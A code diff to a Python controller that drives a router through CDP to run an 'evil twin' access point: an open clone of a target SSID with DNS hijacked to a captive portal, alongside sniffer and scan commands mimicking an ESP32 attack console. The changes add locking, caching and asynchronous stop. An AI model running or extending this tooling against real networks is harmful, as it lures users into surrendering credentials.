@@ -74,6 +74,7 @@ LAB = {
     "events": [],            # [{ts,level,msg}] ring buffer
 }
 LOCK = threading.Lock()
+LAB_OP = threading.Lock()   # one composite router op at a time (scan/stop/start/verify)
 SNIFF = {"proc": None, "on": False, "sent": 0, "drop": 0}
 BLE = {"scan_on": False, "devices": {}}
 FAKEAP = {"on": False}       # deauther-equivalent (channel squat) flag
@@ -83,6 +84,12 @@ def ev(level, msg):
     with LOCK:
         LAB["events"].append({"ts": time.time(), "level": level, "msg": msg})
         del LAB["events"][:-MAX_EV]
+    # mirror into the ESP32 console log (its ws_log equivalent)
+    try:
+        if BRIDGE_CLIENTS:
+            ws_bridge_broadcast({"type": "log", "level": level, "msg": msg})
+    except Exception:
+        pass
 
 def now():
     return time.strftime("%H:%M:%S")
@@ -148,12 +155,25 @@ def page_authed():
         pass
     return False
 
+_AP_CACHE = []
+_AP_TS = 0.0
+
 def ap_list():
-    """Router site survey (real scan) -> ESP32-style list."""
-    if not page_authed():
-        ev("warn", "scan blocked: router session not authenticated")
-        return None
-    r = R.do_scan()
+    """Router site survey (real scan) -> ESP32-style list.
+    Double-checked 60 s cache under LAB_OP: concurrent scans collapse into
+    one real scan, so a scan can never queue behind another scan and blow
+    the console's 30 s budget. Composite op: holds LAB_OP so a scan can't
+    interleave with stop/start CDP chains."""
+    global _AP_CACHE, _AP_TS
+    if time.time() - _AP_TS < 60:
+        return _AP_CACHE
+    with LAB_OP:
+        if time.time() - _AP_TS < 60:        # primed while we waited for the lock
+            return _AP_CACHE
+        if not page_authed():
+            ev("warn", "scan blocked: router session not authenticated")
+            return None
+        r = R.do_scan()
     out = []
     if r.get("ok"):
         for a in r.get("aps", []):
@@ -165,10 +185,16 @@ def ap_list():
                         "pairwise_cipher": 3 if au >= 2 else 0,
                         "group_cipher": 3 if au >= 2 else 0,
                         "wps": "?"})
+        _AP_CACHE, _AP_TS = out, time.time()
     return out
 
+_STA_CACHE = {"ts": 0.0, "data": ([], [])}
+
 def stations():
-    """Router-attached stations + dhcp leases (block 13 / block 9)."""
+    """Router-attached stations + dhcp leases (block 13 / block 9), 8 s cache
+    so the console's frequent polls don't crowd the CDP conversation."""
+    if time.time() - _STA_CACHE["ts"] < 8:
+        return _STA_CACHE["data"]
     sta, leases = [], []
     if not page_authed():
         return sta, leases
@@ -185,6 +211,7 @@ def stations():
                       if e.get("ip") and e.get("ip") != "0.0.0.0"]
     except Exception:
         pass
+    _STA_CACHE["ts"], _STA_CACHE["data"] = time.time(), (sta, leases)
     return sta, leases
 
 def poll_events():
@@ -253,6 +280,10 @@ def twin_start(ssid, channel, sec, key, hijack_ip=""):
     return True, "twin live"
 
 def twin_stop():
+    with LAB_OP:
+        return _twin_stop_unlocked()
+
+def _twin_stop_unlocked():
     ap = LAB.get("ap_block") or {}
     f = {"bBcastSsid": ap.get("bBcastSsid", "1"), "bEnable": ap.get("bEnable", "1")}
     if ap.get("cSsid") is not None:
@@ -873,14 +904,11 @@ def handle_cmd(cmd, p, req_id):
                 "tx_rate": 3}
 
     if cmd == 3:                                    # wifi_scan
-        global _AP_CACHE, _AP_TS
-        if not page_authed():
+        aps = ap_list()                             # cached + LAB_OP'd inside
+        if aps is None:
             return {"req_id": req_id, "status": "error",
                     "message": "Router not authenticated — log in via the panel first (or POST /api/login)"}
-        if time.time() - _AP_TS > 60:               # 60 s scan cache
-            _AP_CACHE = ap_list()
-            _AP_TS = time.time()
-        return {"req_id": req_id, "type": "scan_result", "data": _AP_CACHE}
+        return {"req_id": req_id, "type": "scan_result", "data": aps}
 
     if cmd == 4:                                    # START_EVILTWIN from console
         ssid = p.get("ssid") or LAB["target"].get("ssid")
@@ -891,7 +919,11 @@ def handle_cmd(cmd, p, req_id):
         return {"req_id": req_id, "status": "ok" if ok else "error", "message": msg}
 
     if cmd == 5:                                    # STOP_EVILTWIN
-        lab_engine_stop()
+        # The real ESP32 stops asynchronously; so do we: ACK instantly, run
+        # the (slow, ~12 CDP calls) restore in a worker. The console must not
+        # wait 30s and time out.
+        LAB["stopping"] = True
+        threading.Thread(target=_async_stop, daemon=True).start()
         return {"req_id": req_id, "status": "ok", "message": "Evil Twin Stopped"}
 
     if cmd == 6:                                    # portal target info
@@ -962,10 +994,9 @@ def handle_cmd(cmd, p, req_id):
         return {"req_id": req_id, "status": "ok", "message": "Sniffer Stopped"}
 
     if cmd == 16:                                   # recon APs
-        if not _AP_CACHE:
-            _AP_CACHE = ap_list()
+        cached = ap_list() or []
         aps = [[a["ssid"], a["bssid"], a["signal"], a["channel"], 0, 0,
-                a["authmode"], 0] for a in _AP_CACHE]
+                a["authmode"], 0] for a in cached]
         return {"req_id": req_id, "type": "recon_data", "status": "ok", "aps": aps}
 
     if cmd == 17:                                   # recon clients
@@ -1071,10 +1102,23 @@ async def ws_handler(ws):
         WS_CLIENTS.discard(ws)
 
 # -------------------------------------------------------- lab engine ------
+def _async_stop():
+    """Worker: run the slow router-restore chain off the WS thread."""
+    try:
+        twin_stop()
+        LAB["running"] = False
+        FAKEAP["on"] = False
+        ev("info", "TWIN STOPPED — router config restored")
+    except Exception as e:
+        ev("warn", f"stop: {e}")
+    finally:
+        LAB["stopping"] = False
+
 def lab_engine_start(target, scheme, verify):
-    # twin is OPEN (classic lure vs secured targets); DNS hijack -> this PC
-    ok, msg = twin_start(target.get("ssid", ""), target.get("channel"),
-                         False, "", LAB["http_ip"])
+    with LAB_OP:
+        # twin is OPEN (classic lure vs secured targets); DNS hijack -> this PC
+        ok, msg = twin_start(target.get("ssid", ""), target.get("channel"),
+                             False, "", LAB["http_ip"])
     if not ok:
         return False, msg
     LAB["target"] = target
@@ -1089,10 +1133,9 @@ def lab_engine_start(target, scheme, verify):
         LAB["portal_port"], LAB["dns_port"])
 
 def lab_engine_stop():
-    twin_stop()
-    LAB["running"] = False
-    FAKEAP["on"] = False
-    ev("info", "TWIN STOPPED — router config restored")
+    # control-API variant: also async now (instant ACK, restore in worker)
+    LAB["stopping"] = True
+    threading.Thread(target=_async_stop, daemon=True).start()
     return True
 
 # ------------------------------------------------------- control HTTP -----
